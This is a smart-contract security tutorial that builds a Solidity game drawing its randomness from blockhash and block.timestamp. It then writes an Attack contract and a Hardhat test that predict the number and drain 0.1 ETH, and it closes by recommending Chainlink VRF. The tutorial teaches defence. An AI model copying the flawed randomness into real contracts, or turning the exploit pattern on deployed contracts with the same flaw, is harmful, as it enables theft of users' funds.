---
description: 🤫 A cautionary tale to never use on-chain randomness
---

# Never on-chain randomness

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Randomness is a hard problem. Computers run code that is written by programmers, and follows a given sequence of steps. As such, it is extremely hard to design an algorithm that will give you a 'random' number, since that random number must be coming from an algorithm that follows a certain sequence of steps. Now, of course, some functions are better than others.

In this case, we will specifically look at why you cannot trust on-chain data as sources of randomness (and also why Chainlink VRF's).

### ⚒️ Contract

#### 👀 Overview

* We will build a game where there is a pack of cards.
* Each card has a number associated with it which ranges from `0 to 2²⁵⁶–1`
* Player will guess a number that is going to be picked up.
* The dealer will then at random pick up a card from the pack
* If someone correctly guesses the number, they win `0.1 ETH`
* We will hack this game&#x20;

**Setup a Hardhat project**

```shell
mkdir randomness
cd randomness
npm init --yes
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

# bootstrap the hardhat project
npx hardhat
```

Make sure you select **`Create a Javascript Project`**

Let's first understand what **`abi.encodedPacked`** does.

We have previously used **`abi.encode`** in the Sophomore NFT tutorial, and earlier in the Merkle Tree tutorial.&#x20;

It is a way to concatenate multiple data types into a single bytes array, which can then be converted to a string.&#x20;

This is used to compute the **`tokenURI` ** of NFT collections often.&#x20;

**`encodePacked`** <mark style="color:orange;">takes this a step further, and concatenates multiple values into a single bytes array, but also gets rid of any padding and extra values.</mark>&#x20;

What does this mean?&#x20;

Let's take **`uint256` ** as an example.&#x20;

**`uint256` ** has 256 bits in it's number. But, if the value stored is just `1`, using `abi.encode` will create a string that has 255 `0`'s and only 1 `1`. Using `abi.encodePacked` will get rid of all the extra 0's, and just concatenate the value `1`.

For more information on ** `abi.encodePacked`**, go ahead and read this [article](https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8)

Create a new file inside the **`randomness/contracts`**directory and call it **`Game.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Game {
    constructor() payable {}

    // Randomly picks a number out of `0 to 2²⁵⁶–1`.
    function pickACard() private view returns (uint256) {
        // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
        // which is further converted to a `uint`.
        // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
        uint256 pickedCard = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        return pickedCard;
    }

    // It begins the game by first choosing a random number by calling `pickACard`
    // It then verifies if the random number selected is equal to `_guess` passed by the player
    // If the player guessed the correct number, it sends the player `0.1 ether`
    function guess(uint256 _guess) public {
        uint256 _pickedCard = pickACard();
        if (_guess == _pickedCard) {
            (bool sent, ) = msg.sender.call{value: 0.1 ether}("");
            require(sent, "Failed to send ether");
        }
    }

    // Returns the balance of ether in the contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

Create a new file inside the **`randomness/contracts`**directory and call it **`Attack.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Game.sol";

contract Attack {
    Game game;

    // Creates an instance of Game contract with the help of `gameAddress`
    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    // Attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
    // is accessible publicly
    function attack() public {
        // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
        // which is further converted to a `uint`.
        // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    // Gets called when the contract receives ether
    receive() external payable {}
}
```

* How the attack takes place is as follows:
  * The hacker calls the **`attack` ** function from the **`Attack.sol`**
  * **`attack` ** further guesses the number using the same method as **`Game.sol`** which is **`uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))`**
  * Attacker is able to guess the same number because blockhash and block.timestamp is public information and everybody has access to it
  * The attacker then calls the **`guess` ** function from **`Game.sol`**
  * **`guess` ** first calls the **`pickACard`** function which generates the same number using **`uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)))`** because **`pickACard` ** and **`attack` ** were both called in the same block.
  * **`guess`** compares the numbers and they turn out to be the same.
  * **`guess` ** then sends the **`Attack.sol`  `0.1 ether`** and the game ends
  * Attacker is successfully able to guess the random number

#### Writing the Test

Create a new file inside the **`.../test`**directory and call it **`attack.js`**

```javascript
const { ethers, waffle } = require("hardhat");
const { expect } = require("chai");
const { BigNumber, utils } = require("ethers");

describe("Attack", function () {
  it("Should be able to guess the exact number", async function () {
    // Deploy the Game contract
    const Game = await ethers.getContractFactory("Game");
    const game = await Game.deploy({ value: utils.parseEther("0.1") });
    await game.deployed();

    console.log("Game contract address", game.address);

    // Deploy the attack contract
    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(game.address);

    console.log("Attack contract address", attack.address);

    // Attack the Game contract
    const tx = await attack.attack();
    await tx.wait();

    const balanceGame = await game.getBalance();
    // Balance of the Game contract should be 0
    expect(balanceGame).to.equal(BigNumber.from("0"));
  });
});

```

Now open up a terminal pointing to `randomness` folder and execute this

```sh
npx hardhat test
```

If all your tests passed, you have successfully completed the hack and were able to predict the randomness with 100% accuracy, so it wasn't really that random.

### 👮 Preventions

* Don't use `blockhash`, `block.timestamp`, or really any sort of on-chain data as sources of randomness
* You can use [Chainlink VRF's](https://docs.chain.link/docs/chainlink-vrf/) for true source of randomness
